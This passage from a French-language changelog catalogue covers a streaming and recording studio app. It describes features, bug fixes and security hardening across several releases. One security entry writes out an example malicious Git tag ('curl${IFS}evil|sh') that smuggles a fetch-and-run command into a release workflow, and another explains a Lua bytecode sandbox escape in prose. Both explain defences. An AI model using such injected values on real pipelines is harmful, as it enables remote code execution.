plein</strong> (« ~22 min restantes au débit actuel »). Non modales : un bandeau que l'on peut fermer + l'annonceur pour lecteurs d'écran.","changelog.a76206a6a95f":"<strong>Un bouton panique</strong> (CAP-M22). Un seul raccourci global bascule le programme (ainsi que le canevas vertical et tous les projecteurs) sur un écran de confidentialité configurable, arrête toutes les captures et coupe complètement tout l'audio — le micro n'est même plus capté — tandis que le stream et l'enregistrement restent actifs. Le rétablissement exige une confirmation délibérée en deux étapes.","changelog.0df040fc21b0":"<strong>Un paquet de diagnostic expurgé</strong> (CAP-M24). « Exporter les diagnostics » écrit un zip (instantané de la configuration, sondage des encodeurs et périphériques, statistiques récentes, dernier rapport de plantage) construit selon une <strong>liste d'autorisation</strong> stricte — clés de stream, mots de passe, jetons, chemins de fichiers et textes de l'utilisateur ne sont jamais lus, et encore moins inclus. Vous pouvez lire le contenu exact avant l'export ; rien n'est jamais envoyé nulle part.","changelog.4047624f0a67":"<strong>Une check-list avant le direct</strong> (CAP-M09). Passer en direct exécute désormais d'abord les vérifications : destinations dotées d'une clé, encodeur utilisable, sources en bon état, espace disque suffisant — chacune en vert ou en rouge avec une correction en un clic — plus des rappels honnêtes sur la mesure du micro et de l'audio du bureau et sur le tampon de replay. Un réglage facultatif bloque Passer en direct tant que chaque vérification bloquante n'est pas au vert.","changelog.f0bd6b1eb67e":"Les enregistrements mp4/mov sont passés de l'écriture de l'index à la fin (<code>+faststart</code>) à l'écriture fragmentée ; la réparation de récupération (ou le Remux) produit un fichier faststart classique lorsqu'un logiciel de montage l'exige.","changelog.e2f271c14a12":"Le validateur <code>HotkeySettings</code> encadre désormais aussi les accélérateurs de capture d'image fixe et de panique.","changelog.d236ab9ba3fe":"<span class=\"release__meta\"><span class=\"release__ver\">v0.97.0</span><time class=\"release__date\" datetime=\"2026-07-11\">2026-07-11</time></span><span class=\"release__title\">(Création de scènes et monitoring — CAP-M, lot 1)</span>","changelog.4b1bad38a6e8":"Le premier des trois lots d'indispensables sur la route de 1.0.0. Le compositeur apprend à être <em>édité</em> comme un studio, et pas seulement piloté : un historique d'annulation derrière chaque modification de scène, une sélection multiple avec alignement et distribution et des repères à tirer, des transformations précises que l'on peut copier d'un élément à l'autre, et un atelier d'incrustation qui montre le cache. Il apprend aussi à être <em>surveillé</em> : une multivue de toutes les scènes, des projecteurs plein écran pour n'importe quelle scène / source / programme / aperçu sur n'importe quel écran, et une capture d'image fixe sans perte en une touche. Enfin, il s'ouvre au monde d'où il vient — en important une collection de scènes OBS et en retrouvant les médias qui ont été déplacés.","changelog.7219ebda2472":"<strong>Annuler/rétablir sur plusieurs étapes pour chaque modification de scène</strong> (CAP-M01). Un historique borné d'instantanés étiquetés fonctionne sous le même verrou que la collection ; un geste continu (un glissement, un mouvement de fader) se replie en une seule étape ; <code>Ctrl</code>/<code>Cmd</code>+<code>Z</code> annule les modifications — jamais l'émission en direct (la sélection de la scène au programme, la vue centrée et le focus restent hors de la pile). Une liste d'historique consultable montre exactement ce que chaque étape annulera.","changelog.aae31a6bbe7f":"<strong>Un importateur de collections de scènes OBS</strong> (CAP-M02). Pointez-le vers un <code>scenes.json</code> d'OBS et il reprend les scènes, l'ordre d'empilement, la visibilité/le verrouillage/le mode de fusion de chaque élément, les sources couleur/texte/image/média, les captures d'écran/de fenêtre/de caméra/audio, les scènes imbriquées, ainsi que les filtres vidéo <strong>et</strong> audio qu'il reconnaît — puis rend un <strong>rapport honnête par source</strong> : ce qui est passé sans souci, ce dont le périphérique de capture doit être choisi à nouveau, ce qui référence un fichier à vérifier, et ce qui n'avait pas d'équivalent et a été ignoré. Les tailles et positions des éléments sont ajustées à partir de la disposition d'OBS (un fichier de scènes ne contient ni la taille native des sources ni le canevas), et le rapport le précise.","changelog.d6bb32be4ef4":"<strong>Un médecin des fichiers manquants</strong> (CAP-M03). Au chargement — ou à la demande depuis la palette — il parcourt la collection à la recherche de chemins d'image / de média / de police / de LUT / de masque qui ne se résolvent plus et propose de relier chacun d'eux. Corriger un chemin cassé répare toutes les scènes qui l'utilisaient ; « Localiser dans un dossier… » fait correspondre les fichiers en masse par leur nom.","changelog.6f96fd6fdf78":"<strong>L'alignement gagne une vraie sélection multiple</strong> (CAP-M04). Shift-clic et un rectangle de sélection élastique sélectionnent plusieurs éléments ; faites glisser n'importe lequel pour déplacer le groupe (aimanté comme un seul cadre) ; alignez leurs bords/centres les uns sur les autres ou répartissez-les uniformément. Et vous pouvez tirer vos propres <strong>lignes de repère</strong> — glisser pour déplacer, glisser hors du canevas pour supprimer — sur lesquelles s'aimantent les éléments déplacés, dessinées à la fois sur l'aperçu JPEG et sur l'aperçu GPU natif.","changelog.13b73aeb27b0":"<strong>Un panneau de transformation précise avec copier/coller</strong> (CAP-M05). Saisissez la position relative au point d'ancrage, la taille, la rotation et le rognage d'un élément ; copiez une transformation ou toute une chaîne de filtres et collez-la sur un autre élément en une seule étape d'annulation.","changelog.5b8587772325":"<strong>Un atelier d'incrustation</strong> (CAP-M26). Réglez une incrustation chroma/couleur/luma sur une vue en direct d'une seule source, avec un mode cache (alpha → gris), une pipette, une loupe et une séparation avant/après déplaçable.","changelog.630487ce7411":"<strong>Un moniteur multivue</strong> (CAP-M06) — une grille en direct de toutes les scènes avec tally rouge (programme) / vert (aperçu) ; un clic pour couper ou (en mode Studio) pour préparer. Elle peut s'ouvrir dans sa propre fenêtre sur n'importe quel écran.","changelog.cfb92d0b5e04":"<strong>Des projecteurs pour tout, partout</strong> (CAP-M07) — affichez en plein écran le programme, l'aperçu du mode Studio, une <strong>scène précise</strong> ou une <strong>source unique</strong> sur n'importe quel écran connecté (ou dans une fenêtre flottante). Au lancement suivant, les projecteurs se rouvrent là où vous les avez laissés.","changelog.d31889806a32":"<strong>Une capture d'image fixe en une touche</strong> (CAP-M08) — un PNG sans perte du programme (ou d'une seule source, avant ou après filtres) dans le dossier des enregistrements, attribuable à un raccourci global.","changelog.77c37009de86":"La sélection de scène est désormais une véritable sélection multiple dans tout l'aperçu ; une transformation groupée valide les alignements / répartitions / déplacements de groupe en une seule étape d'annulation.","changelog.f1cc3f1d7724":"Le canal <code>preview://</code> a gagné des emplacements de projecteur pleine résolution par cible et un routage de projecteur par scène, à côté des emplacements existants programme / aperçu / vertical / atelier / multivue ; CORS reste limité aux origines propres de l'application.","changelog.e27bd21b1216":"<span class=\"release__meta\"><span class=\"release__ver\">v0.96.0</span><time class=\"release__date\" datetime=\"2026-07-10\">2026-07-10</time></span><span class=\"release__title\">(Accessibilité, 18 langues, prise en main et thèmes)</span>","changelog.dfb83dff1086":"Phase 9 : les finitions du lancement. Le studio parle désormais dix-huit langues, s'utilise entièrement au clavier et se fait entendre par un lecteur d'écran, se configure tout seul au premier lancement et peut adopter un thème clair.","changelog.ed8d27bca3a0":"Deux des bugs ci-dessous auraient été livrés dans 1.0.0 et méritent d'être nommés, car tous deux étaient invisibles en revue et tous deux sont désormais contrôlés par un linter ou un test plutôt que par la mémoire. Le thème clair n'était qu'à moitié réparé — le mode sombre a l'air parfait qu'une surface ait ou non une variante claire, si bien que des commandes blanc sur blanc passent la revue de code à chaque fois. Et une mise à niveau depuis 0.95.1 aurait relancé l'assistant du premier lancement, dont le modèle de départ ajoute une seconde capture d'écran à la scène qu'un utilisateur existant avait déjà agencée.","changelog.245328562168":"<strong>Le studio parle 18 langues</strong> (TASK-902) — <code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, à partir d'un catalogue Fluent de <strong>989 clés</strong>. Une nouvelle installation suit la langue du système d'exploitation ; un choix explicite l'emporte. L'arabe active <code>&lt;html dir=&quot;rtl&quot;&gt;</code>. L'anglais sert de couche de base sous chaque langue, si bien qu'une clé qu'un traducteur n'a pas encore traitée s'affiche en anglais plutôt que sous forme d'identifiant brut. <code>npm run i18n:lint</code> fait échouer la CI en cas de clé manquante, de clé orpheline, de doublon ou d'un <code>t(&quot;…&quot;)</code> qui ne désigne rien.","changelog.c9eb7215afcc":"Un linter de parité prouve que les 18 catalogues concordent <em>entre eux</em> ; il ne dit rien de la présence des chaînes de l'application dans ces catalogues. Trois contrôles supplémentaires comblent cette lacune : un test qui vérifie que chaque entrée d'une table de libellés se résout, une recherche des clés que rien ne référence, et une recherche des appels à <code>t()</code> au niveau du module — qui figeraient une chaîne dans la langue chargée au moment de l'import, sans jamais la retraduire.","changelog.060a09e005da":"<strong>Un assistant de premier lancement qui configure la machine sur laquelle il tourne réellement</strong> (TASK-903, TASK-905). Il énumère les GPU et les cœurs physiques, classe les encodeurs matériels disponibles et propose un encodeur, un canevas, des fps et un débit <em>en indiquant la raison dans la langue de l'utilisateur</em>. Un encodeur que le pilote a déjà refusé est ignoré plutôt que recommandé. Accepter se fait en un clic ; conserver vos réglages aussi. Passer l'assistant compte comme le terminer — il ne revient jamais.","changelog.62ba4a6d41af":"<strong>Une palette de commandes</strong> sur <code>Ctrl</code>/<code>Cmd</code>+<code>K</code> (TASK-904), avec une recherche par sous-séquences, si bien que <code>ssc</code> trouve « Start Screen Capture ».","changelog.925da222cab8":"<strong>Une seule fenêtre Paramètres et une page À propos</strong> (TASK-906, TASK-907) — langue, thème et dock de statistiques d'un côté ; version, métadonnées de build, licences et outil de signalement de bugs de l'autre.","changelog.bece666d04b9":"<strong>Thèmes clair et personnalisé.</strong> La couleur d'accent est une propriété CSS personnalisée validée au format <code>#rrggbb</code> des deux côtés de la frontière IPC, car une chaîne écrite dans une feuille de style est un point d'injection.","changelog.dd70fb65720c":"<strong>Le studio se parcourt désormais sans souris ni écran</strong> (TASK-901). Chaque arrêt du clavier affiche un anneau de focus visible ; les boîtes de dialogue retiennent <code>Tab</code> et rendent le focus là où elles l'ont pris ; <code>aria-modal</code> repose désormais sur un vrai piège à focus plutôt que sur une promesse. Le passage en direct, l'enregistrement, la reconnexion et la perte d'une seconde de vidéo à cause d'images perdues sont annoncés aux lecteurs d'écran via une région <code>aria-live</code>. Le réglage « réduire les animations » du système est respecté.","changelog.ff6f0dc97e11":"<strong>Une mise à niveau ne relance plus l'assistant du premier lancement.</strong> <code>completedOnboarding</code> est nouveau, et une clé absente vaut <code>false</code> par défaut : chaque installation existante aurait donc été accueillie par un assistant dont le modèle de départ ajoute une <em>seconde</em> capture d'écran par-dessus la scène que l'utilisateur avait déjà agencée. Les fichiers de paramètres sont désormais migrés au chargement : un fichier antérieur à ce champ mais qui a déjà accepté un CLUF a de toute évidence déjà servi. La migration se fonde sur l'<em>absence</em> du champ, et non sur une valeur fausse — quelqu'un qui quitte l'assistant à mi-parcours a écrit <code>false</code> volontairement et doit le revoir.","changelog.5cf1579964ec":"<strong>Le thème clair ne s'affiche plus en blanc sur blanc.</strong> Les panneaux sont dessinés en <em>blanc</em> translucide sur un fond presque noir, et une variable CSS ne peut pas atteindre l'intérieur d'une classe utilitaire <code>bg-white/10</code> : le thème clair reteinte donc ces noms de classe en noir translucide. Six avaient été oubliés : les pastilles muet/gate de la console, le badge REC, les pistes des barres de progression des téléchargements, les pastilles d'état, le point « terminé » du dock de statistiques et le filet de la citation du CLUF. <code>npm run theme:lint</code> fait désormais échouer la CI sur toute classe utilitaire en blanc translucide qui n'a ni variante claire ni entrée de liste d'autorisation expliquant pourquoi elle peut rester blanche.","changelog.b78b64a1e1a5":"<strong>Choisir une couleur d'accent ne plonge plus un utilisateur du thème clair dans le noir.</strong> Le nuancier forçait le thème Personnalisé pour « fonctionner » depuis n'importe quel mode, mais Personnalisé repose sur le thème sombre — le moindre ajustement de couleur abandonnait en silence le thème Clair. Le nuancier est désormais désactivé en dehors de Personnalisé.","changelog.7d0190596194":"<strong>Les lecteurs d'écran n'annoncent plus une rafale d'images perdues à chaque reconnexion.</strong> Le nombre d'images perdues est cumulatif et continue de grimper pendant une coupure : le premier relevé d'état après le retour à l'antenne le comparait donc à la valeur d'avant la coupure et annonçait toute la coupure comme une nouvelle rafale — en plus des annonces « reconnexion » et « en direct » que l'auditeur avait déjà entendues.","changelog.a83950358bea":"<strong>L'échec d'un enregistrement des paramètres n'efface plus un réglage sans rapport.</strong> Le retour arrière restaurait tout l'instantané des paramètres capturé à l'affichage de la boîte de dialogue, si bien qu'un enregistrement raté pouvait annuler un <em>autre</em> réglage enregistré avec succès entre-temps. Le magasin est désormais relu à la place.","changelog.aac84f9f1108":"<strong>Les enregistrements <code>.frec</code> ont désormais leur propre icône dans l'Explorateur.</strong> Le schéma <code>fileAssociations</code> de Tauri n'a pas de champ <code>icon</code> et son modèle NSIS fixe en dur le <code>DefaultIcon</code> de l'association sur l'exécutable de l'application : chaque enregistrement affichait donc l'icône du studio pendant que <code>icons/frec.ico</code> dormait, inutilisé, dans le dossier d'installation. Un hook <code>NSIS_HOOK_POSTINSTALL</code> réécrit le <code>DefaultIcon</code> du ProgId après l'écriture de l'association et émet <code>SHCNE_ASSOCCHANGED</code> pour que l'Explorateur se redessine sans déconnexion. <em>(Windows ; le <code>.icns</code> macOS et le paquet MSI affichent encore l'icône de l'application — ce sont des suites distinctes.)</em> À noter : l'association est enregistrée par le <strong>programme d'installation</strong>, si bien qu'un <code>.frec</code> affiche l'icône générique tant que Freally Capture n'est pas installé, par opposition à un lancement depuis un dossier de build.","changelog.64cdb0e5fc96":"<span class=\"release__meta\"><span class=\"release__ver\">v0.95.1</span><time class=\"release__date\" datetime=\"2026-07-09\">2026-07-09</time></span><span class=\"release__title\">(Rapports de plantage, persistance du CLUF et correctifs des boîtes de dialogue)</span>","changelog.ec29332c27cd":"Six bugs découverts en éprouvant le parcours de signalement de bugs sur du vrai matériel — dont deux auraient été livrés dans 1.0.0 — plus le travail sur les rapports de plantage et l'outil de mise à jour que ces essais ont exigé. Un plantage vous est désormais signalé, et le studio redémarre avec le rapport déjà ouvert.","changelog.a70a547d08ad":"<strong>Un plantage vous est désormais signalé, et le studio redémarre.</strong> Une application mourante ne peut pas afficher sa propre fenêtre d'erreur : le hook de panique lance donc le même exécutable sous la forme d'un petit assistant sans Tauri (<code>--crash-notice &lt;pid&gt;</code>), qui affiche une boîte de dialogue native « Freally Capture s'est arrêté de manière inattendue », attend que le processus planté quitte la table des processus, puis relance l'application. Le studio rouvert affiche automatiquement le rapport expurgé. L'attente est essentielle : relancer pendant que le processus mort détient encore le verrou d'instance unique fond le nouveau lancement dans l'application mourante et ne laisse aucun studio du tout.","changelog.71da0a3520ee":"<strong>Accepter le CLUF ne s'annule plus tout seul.</strong> <code>App.tsx</code> lit les paramètres <em>et</em> l'état du CLUF au montage, si bien que l'instantané des paramètres est antérieur à l'acceptation ; modifier n'importe quel réglage dans cette même session réécrivait la valeur périmée <code>acceptedEulaVersion: null</code> par-dessus, et l'écran d'acceptation revenait au lancement suivant. Un profil enregistré avant l'acceptation faisait de même. <code>SettingsStore::set()</code> préserve désormais ce champ et <code>accept_eula()</code> est le seul à l'écrire.","changelog.327bad332e86":"<strong>Les boîtes de dialogue étaient piégées dans leur dock.</strong> Le <code>backdrop-blur</code> de <code>Panel</code> en fait le bloc conteneur de <code>position: fixed</code>, si bien que la superposition de <code>PickerShell</code> se centrait dans la zone du dock plutôt que dans la fenêtre — 16 boîtes de dialogue sur 19, dont <em>Vérifier les mises à jour</em>, s'affichaient en partie hors de l'écran, leurs boutons inaccessibles. <code>PickerShell</code> passe désormais par un portail vers <code>document.body</code>.","changelog.05a8d823f564":"<strong>Les rapports de plantage envoyés par e-mail n'ouvraient rien, en silence.</strong> La longueur de l'URL était limitée en nombre de caractères, mais l'encodage en pourcentage multiplie par neuf un caractère de 3 octets — une vraie trace d'appels produisait un <code>mailto:</code> d'environ 7800 caractères, au-delà de la limite d'environ 2048 de ShellExecute sous Windows, qui ouvre alors une fenêtre vide sans signaler d'erreur. La limite porte désormais sur l'<strong>URL entière</strong> (schéma, adresse, objet et corps ensemble), appliquée à la longueur encodée, et la troncature ne coupe jamais une séquence d'échappement. Limiter seulement le corps ne suffisait pas : l'objet est du texte saisi par l'utilisateur, et 80 caractères CJK s'encodent en 720 octets, si bien qu'un rapport non anglais atteignait encore environ 2285 caractères.","changelog.b0d9792ddddb":"<strong>Deux paniques simultanées affichaient deux boîtes de dialogue de plantage.</strong> <code>panic = &quot;abort&quot;</code> n'arrête pas tout instantanément : deux threads pouvaient chacun exécuter le hook. L'avis n'est désormais lancé qu'une fois au plus par processus.","changelog.6747e7604c73":"<strong>Un assistant d'avis de plantage sans pid lisible relançait immédiatement</strong>, droit dans la course à l'instance unique qu'il est justement censé éviter. Il attend désormais un intervalle fixe.","changelog.c52ec7fca94b":"<strong>Les menus déroulants restaient ouverts quand on cliquait ailleurs.</strong> Le menu <strong>+</strong> du rail Sources et les deux menus <em>Ajouter un filtre</em> se ferment désormais sur un clic à l'extérieur ou sur Escape. Escape ne ferme que l'élément le plus intérieur : un menu dans une boîte de dialogue se ferme à la première pression, la boîte de dialogue à la seconde.","changelog.ceb3ac683c32":"<strong>Rédiger dans Gmail</strong> à côté du bouton existant du client de messagerie — simple https, pas de clé d'API, rien n'est envoyé automatiquement ; un utilisateur déconnecté arrive sur l'écran de connexion de Google puis revient au brouillon prérempli.","changelog.3ed3900cea6b":"<strong>Les rapports de plantage indiquent l'heure à laquelle ils se sont produits</strong>, selon l'horloge locale de l'utilisateur avec son décalage UTC, et en UTC. Le décalage est faiblement identifiant et documenté comme la seule exception délibérée à la règle « aucun identifiant personnel » du rapport ; l'utilisateur lit le texte exact avant l'envoi.","changelog.2757df14a536":"<strong>Le studio vérifie les mises à jour une fois au lancement</strong> et présente la nouvelle version, son numéro et les notes de version de ce fichier dans un champ en lecture seule, avec un choix oui/non explicite. Un rapport de plantage en attente a toujours la priorité ; la mise à jour attend alors le lancement suivant. Les vérifications hors ligne ou limitées en débit restent silencieuses. <code>latest.json</code> contient désormais la section <code>CHANGELOG.md</code> de la version dans son champ <code>notes</code>.","changelog.0ceef8bf9dbd":"Les mises à jour sous Windows lancent désormais l'assistant NSIS (<code>installMode: basicUi</code>) pour que la page de fin propose <strong>Lancer Freally Capture</strong> et une case pour le raccourci sur le bureau, au lieu de redémarrer en silence. Le programme d'installation porte aussi l'icône de l'application (<code>nsis.installerIcon</code>) au lieu de l'icône standard de NSIS.","changelog.04d1725214c0":"La section <strong>Tests</strong> de la boîte de dialogue de signalement de bug (<em>Simuler un rapport de plantage</em>, <em>Forcer un plantage de test</em>) et ses deux commandes IPC. Une commande « faire planter l'application » n'a rien à faire dans un studio en production ; la boucle est éprouvée avec l'option de lancement <code>--test-crash</code>, qui n'a ni bouton ni commande derrière elle.","changelog.6bd81d475bf0":"<strong>Workflow de publication : injection shell via le nom du tag.</strong> <code>${{ github.ref_name }}</code> était interpolé directement dans des blocs <code>run:</code>, si bien que GitHub insérait le tag dans le <em>code source</em> shell avant que bash ne l'analyse. Les noms de ref interdisent les espaces mais autorisent <code>&quot;</code>, <code>;</code>, <code>$</code> et les backticks, et <code>${IFS}</code> fournit l'espace — un tag comme <code>v1&quot;;curl${IFS}evil|sh;&quot;</code> aurait été exécuté. Le tag parvient désormais au script via <code>env:</code>, en tant que donnée. L'exploitation exigeait le droit de pousser des tags : il s'agit donc d'une défense en profondeur.","changelog.81cccf7322b4":"Le <code>actions/checkout</code> du job de publication définit désormais <code>persist-credentials: false</code>. Il détient <code>contents: write</code> et ne lit que <code>CHANGELOG.md</code> ; laisser le <code>GITHUB_TOKEN</code> dans <code>.git/config</code> aurait offert à toute injection future un moyen tout prêt de pousser.","changelog.25ca7c7f85dd":"<code>PRIVACY.md</code> indique désormais clairement que la vérification des mises à jour s'exécute <strong>une fois par lancement</strong> et pas seulement sur demande, et qu'elle n'envoie rien concernant l'utilisateur — l'ancienne formulation disait que chaque requête réseau était « déclenchée par votre action », ce que la nouvelle vérification au démarrage rendait faux.","changelog.46a767ffc1f9":"<span class=\"release__meta\"><span class=\"release__ver\">v0.95.0</span><time class=\"release__date\" datetime=\"2026-07-08\">2026-07-08</time></span><span class=\"release__title\">(Capture de jeu, distribution et audio par application — Phase 8)</span>","changelog.599aa55a76f0":"Mise à jour automatique signée et auto-hébergée, capture audio par application, une jonction pour l'environnement NDI, une jonction de capture de jeu qui signale honnêtement le risque anti-triche, un écran d'acceptation du CLUF au premier lancement et la vidéo dans le stream pour les réactions et les critiques — la surface « vers 1.0.0 » de la phase 8, entièrement locale et désactivée par défaut.","changelog.5903d686ccbb":"Ajouté — Phase 8","changelog.eb682bb7ec7d":"<strong>Outil de mise à jour automatique signé et auto-hébergé</strong> (TASK-803) — l'application consulte un <code>latest.json</code> signé sur le point de terminaison des releases GitHub et vérifie chaque téléchargement avec une clé publique minisign intégrée au binaire avant de l'appliquer (un paquet non signé ou altéré est refusé). <strong>⭳ Vérifier les mises à jour…</strong> dans le dock Contrôles — rien n'est téléchargé sans un clic ; l'application redémarre pour terminer. La chaîne de publication signe chaque artefact et compose <code>latest.json</code> ; la signature Developer ID + la notarisation macOS sont câblées et conditionnées à des secrets (passage à un certificat payant, sans modification du workflow). Voir <code>design/updater-signing.md</code>.","changelog.883b1ffbdb75":"<strong>Capture audio par application</strong> (TASK-805) — capturez l'audio d'une application comme une source distincte dans la console. D'abord sous Windows via le <strong>process loopback</strong> WASAPI (<code>ActivateAudioInterfaceAsync</code> sur le périphérique virtuel process-loopback, Win10 2004+) ; le code COM <code>unsafe</code> est isolé dans la nouvelle crate <code>fcap-appaudio</code>, si bien que <code>fcap-audio</code> reste en <code>#![forbid(unsafe_code)]</code>. Elle obtient une tranche complète dans la console (VU-mètre, fader, coupure, monitoring, filtres, piste). Linux et macOS affichent des indications honnêtes propres à chaque système. Sources ▸ <strong>Audio d'application</strong>.","changelog.56b6b2b908a6":"<strong>Jonction de capture de jeu + signalement honnête des risques anti-triche/antivirus</strong> (TASK-801) — la « Capture de jeu » (l'injection d'un hook DX/GL/Vulkan) est un <strong>jalon signalé</strong>, à activer soi-même : l'application n'injecte jamais rien en silence et expose le <strong>risque de bannissement</strong> lié à l'anti-triche + le risque antivirus avant tout hook. La voie qui fonctionne aujourd'hui — la <strong>Capture de fenêtre</strong> (sans bordure/fenêtré) — est recommandée pour chaque système (Wayland → le portail). Sources ▸ <strong>Capture de jeu (à lire d'abord)</strong>.","changelog.ec03a805ba49":"<strong>Jonction de l'environnement NDI</strong> (TASK-804) — la sortie NDI facultative détecte un environnement NDI installé par l'utilisateur (jamais intégré) via les variables d'environnement documentées + les dossiers par défaut et teste son chargement ; l'indicateur typé de la sortie est conditionné à cette détection. L'envoi d'images se liera aux en-têtes du SDK NDI gratuit (suite nommée). Affiché en lecture seule dans Composants ▸ <strong>Intégrations optionnelles</strong>.","changelog.eaa0871281d1":"<strong>Écran d'acceptation du CLUF au premier lancement</strong> — le studio ne s'affiche pas tant que la version actuelle du CLUF n'est pas acceptée (faire défiler pour lire, <strong>J'accepte</strong> / <strong>Refuser et quitter</strong>) ; l'acceptation est enregistrée, et la demande ne revient que lorsque la version du CLUF change. <code>EULA.md</code> est intégré à la compilation, si bien que le texte accepté est exactement celui qui est livré.","changelog.52426b69775a":"<strong>La vidéo dans le stream (réaction/critique)</strong> — intégrez une vidéo dans la scène et <strong>mettez-la en pause / reprenez-la en direct</strong> pendant que vous parlez par-dessus, puis retirez-la — l'audio de la source Média se met en pause et reprend dans le mix en même temps que l'image (⏸/▶ sur les sources média).","changelog.082d1c8d5bec":"<strong>Téléchargements de composants dans l'application</strong> — le téléchargement à la demande de ffmpeg affiche désormais un pourcentage explicite du type <code>98.35%</code> à côté de sa barre de progression + un bouton d'annulation. Un nouveau composant <strong>Environnement de la source navigateur (Chromium/CEF)</strong> télécharge l'environnement CEF d'environ 100 MB avec la même transparence : il identifie la build stable la plus récente dans l'index officiel des builds CEF, <strong>vérifie le téléchargement avec le SHA-1 de cet index avant de le décompresser</strong> (rien d'intégré, aucun hachage codé en dur) et le met en cache pour chaque utilisateur — avec la même interface pourcentage/barre/annulation. La <em>source</em> navigateur qui affiche les pages grâce à cet environnement est un jalon à part entière, à venir ; cette version livre le téléchargement de l'environnement.","changelog.1dc8ae2f6900":"Périmètre défini honnêtement (Phase 8)","changelog.158788627266":"<strong>VST2/3</strong> (TASK-804) — reporté derrière un indicateur : le SDK VST2 n'est plus proposé sous licence par Steinberg et VST3 est sous GPLv3 ou propriétaire, deux situations incompatibles avec une build à 0 $ sans licence supplémentaire. L'ensemble de filtres DSP maison (débruitage, gate, compresseur, limiteur, égaliseur, gain, ducking) est l'alternative livrée.","changelog.c436d24d7e3a":"<strong>L'injection du hook GPU de capture de jeu</strong> et <strong>l'envoi d'images NDI</strong> sont les jalons à venir, nommés, pour lesquels les jonctions ci-dessus sont stables.","changelog.8843550dc6eb":"<span class=\"release__meta\"><span class=\"release__ver\">v0.90.0</span><time class=\"release__date\" datetime=\"2026-07-08\">2026-07-08</time></span><span class=\"release__title\">(Contrôle à distance, scripts et plugins — la surface d'extensibilité)</span>","changelog.a7f6a66abff0":"Pilotez le studio depuis un Stream Deck, réagissez au passage en direct avec un script, intégrez un dock de chat et étendez l'application avec un plugin — la surface d'extensibilité de la phase 7, entièrement <strong>locale et désactivée par défaut</strong>.","changelog.3f14c1391b04":"Ajouté — extensibilité (Phase 7)","changelog.cc7d3cbcb365":"<strong>API de contrôle à distance WebSocket</strong> (TASK-701) — un WebSocket protégé par mot de passe auquel se connecte un contrôleur de type Stream Deck / Companion : changer de scène, lancer la transition, démarrer/arrêter le stream et l'enregistrement, sauvegarder des replays, régler coupures et volumes — les mêmes actions que l'interface, rien de plus (il ne peut pas lire de fichiers). <strong>Désactivé par défaut</strong> ; écoute sur <code>127.0.0.1</code> sauf si le réseau local est explicitement activé ; désactivé, le port est fermé. L'authentification fonctionne par défi-réponse — le mot de passe ne transite jamais sur le réseau. Paramètres → Contrôles → <strong>⌁ Remote…</strong>.","changelog.155aa02952b7":"<strong>Docks de navigateur</strong> (TASK-702) — ouvrez une fenêtre de chat détachée, une page d'alertes ou les boutons web de Companion dans leur propre fenêtre à côté du studio (http/https uniquement ; le dock n'a aucun accès à l'application, il se contente d'afficher). Contrôles → <strong>⧉ Docks…</strong>.","changelog.3149da08891b":"<strong>Scripts Lua en bac à sable</strong> (TASK-703) — des scripts <code>.lua</code> qui réagissent aux événements du studio (passage en direct, changement de scène, état de l'enregistrement) et pilotent la même surface de commandes que l'API distante. Le bac à sable n'a <strong>aucun accès aux fichiers ni au système</strong> (pas de <code>io</code>/<code>os</code>/<code>require</code>, et les chargeurs de bytecode sont fermés) ; une erreur de script reste confinée. <code>scripts/sample.lua</code> présente l'API. Contrôles → <strong>⚡ Scripts…</strong>.","changelog.507908bbd502":"<strong>SDK de plugins</strong> (TASK-704) — des contrats <code>Source</code>/<code>Filter</code> documentés + une jonction de registre, pour qu'une crate de plugin puisse ajouter une source ou un filtre <strong>sans toucher au cœur</strong>. <code>plugins/checkerboard</code> est l'exemple complet ; <code>design/plugin-sdk.md</code> est le guide.","changelog.5c03c1a47d1d":"<strong>Page web pour rejoindre depuis un téléphone</strong> (TASK-R3) — le QR code d'invitation ouvre désormais <code>docs/join.html</code> sur le site Pages : le côté invité d'une session d'invités à distance, dans un simple navigateur (caméra + micro, connexion sur clic explicite, coupure de son propre micro selon le modèle à deux verrous, talkback de l'hôte + vue de l'hôte, partage d'écran là où le navigateur le permet, reconnexion automatique avec temporisation progressive) — sans installation ni CDN (PeerJS est embarqué). Le lien <code>freally://</code> copiable ouvre toujours directement l'application.","changelog.41ecc350d86a":"<strong>Aperçu natif (Windows)</strong> — la première construction de surface par le thread de rendu est désormais sérialisée avec les validations DirectComposition du thread d'interface sous le verrou de superposition (une course étroite donnait un aperçu vide quand un redimensionnement tombait exactement à la naissance de la surface), et le cadre de sélection natif réutilise désormais le calcul de taille de la chaîne de rognage du compositeur lui-même au lieu d'une copie écrite à la main (TASK-NP7).","changelog.e2d476fc460a":"<strong>Capture de fenêtre</strong> — la pompe du curseur ne synthétise plus d'images non dessinées à ~60 fps pendant que le curseur se déplace ailleurs que <em>sur</em> la fenêtre capturée (une autre fenêtre la recouvrant, ou n'importe où ailleurs sur le bureau). Découvert par le nouveau banc de tests en conditions réelles à un processus par test (<code>scripts/live-capture-tests.ps1</code>, TASK-NP9), qui évite aussi la course à la destruction WinRT/D3D susceptible de faire planter les exécutions de plusieurs tests en conditions réelles.","changelog.d574645cb05e":"<strong>Documents de la charte</strong> — README / PRIVACY / SECURITY décrivent désormais honnêtement la surface réseau P2P des invités à distance, à activer soi-même (invitations qui expirent, connexion sur clic explicite, médias P2P en DTLS-SRTP, le broker ne transporte que la poignée de main, TURN facultatif appartenant à l'utilisateur, modération et sémantique du bannissement), et <code>THIRD-PARTY-NOTICES.md</code> a reçu les entrées manquantes pour PeerJS et qrcode-generator.","changelog.c173f50767b2":"<strong>Renforcement du bac à sable Lua</strong> — le bac à sable de scripts ferme désormais <code>load</code>/<code>loadstring</code> de la bibliothèque de base et <code>string.dump</code>, et pas seulement <code>dofile</code>/<code>loadfile</code>. Dans Lua 5.4, <code>load</code> accepte par défaut du <strong>bytecode binaire</strong>, dont le chargeur n'est pas vérifié — un bloc de bytecode forgé permet de s'échapper de la VM vers du code natif, contournant entièrement le bac à sable sans io ni os. Repéré par la revue de sécurité de cette phase avant la publication ; un test de non-régression vérifie que les trois ont disparu.","changelog.1ebe7221d5d2":"<span class=\"release__meta\"><span class=\"release__ver\">v0.85.0</span><time class=\"release__date\" datetime=\"2026-07-07\">2026-07-07</time></span><span class=\"release__title\">(La diffusion en profondeur : multistream / SRT / WHIP + scènes, sources et encodeurs en profondeur)</span>","changelog.2d315220f41f":"<strong>Le moment magique</strong> — passez en direct sur Twitch <strong>et</strong> YouTube à la fois tout en enregistrant une copie locale séparée et en sauvegardant un replay de 30 secondes, avec une sortie verticale 9:16, des scènes 